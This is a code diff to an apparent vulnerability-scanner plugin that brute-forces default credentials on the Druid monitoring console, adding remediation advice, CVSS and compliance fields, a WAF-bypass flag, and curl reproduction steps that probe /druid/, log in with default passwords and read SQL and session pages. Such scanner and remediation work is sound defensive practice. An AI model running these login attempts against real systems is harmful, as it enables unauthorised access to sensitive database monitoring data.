@@ -8,11 +8,45 @@ from config import settings
 
 class DruidBrutePlugin(PluginBase):
     name = 'Druid 弱口令爆破'
-    cve = ''
+    cve = 'N/A'
     severity = 'high'
     category = 'brute'
     description = '对 /druid/submitLogin 用 6 个默认用户名 + password.txt 字典爆破，命中 success 即成功'
     fix = '修改 Druid 监控默认口令，限制访问来源 IP，关闭未授权的 /druid 路径'
+    fix_detail = (
+        '【配置修改】application.yml 修改 Druid 监控账号密码：\n'
+        '  spring.datasource.druid.stat-view-servlet.login-username: <强口令>\n'
+        '  spring.datasource.druid.stat-view-servlet.login-password: <强口令>\n'
+        '【IP 白名单】限制访问来源：\n'
+        '  spring.datasource.druid.stat-view-servlet.allow: 127.0.0.1,192.168.0.0/16\n'
+        '  spring.datasource.druid.stat-view-servlet.deny: 空\n'
+        '【禁用监控】生产环境可关闭 Druid 监控：\n'
+        '  spring.datasource.druid.stat-view-servlet.enabled: false\n'
+        '【WAF 规则】拦截外网对 /druid/* 路径的访问\n'
+        '【合规】等保 2.0 8.1.4 要求：身份鉴别信息复杂度'
+    )
+    reproduce = (
+        '# 探测 Druid 监控是否可访问：\n'
+        'curl "http://target/druid/" -i\n'
+        '  # 返回 302 跳转到 /druid/login.html 即存在 Druid 监控\n'
+        '\n'
+        '# 尝试默认口令登录（admin/admin、admin/123456 等）：\n'
+        'curl -X POST "http://target/druid/submitLogin" \\\n'
+        '  -d "loginUsername=admin&loginPassword=admin"\n'
+        '\n'
+        '# 预期响应（成功）：响应体含 "success" 字样\n'
+        '\n'
+        '# 登录成功后可查看 SQL 监控、会话信息、连接池状态等敏感信息：\n'
+        'curl "http://target/druid/sql.html" -b "JSESSIONID=<已登录的 session>"'
+    )
+    # D2：Druid 监控未授权全版本存在（取决于配置）
+    affected_versions = ''
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N'
+    compliance = '等保2.0:8.1.4;OWASP:A07:2021'
+    # D7: WAF 绕过支持
+    vuln_type = 'auth'
+    supports_waf_bypass = True
 
     def verify(self, target, session):
         # 用户名清单严格保留（6 个）
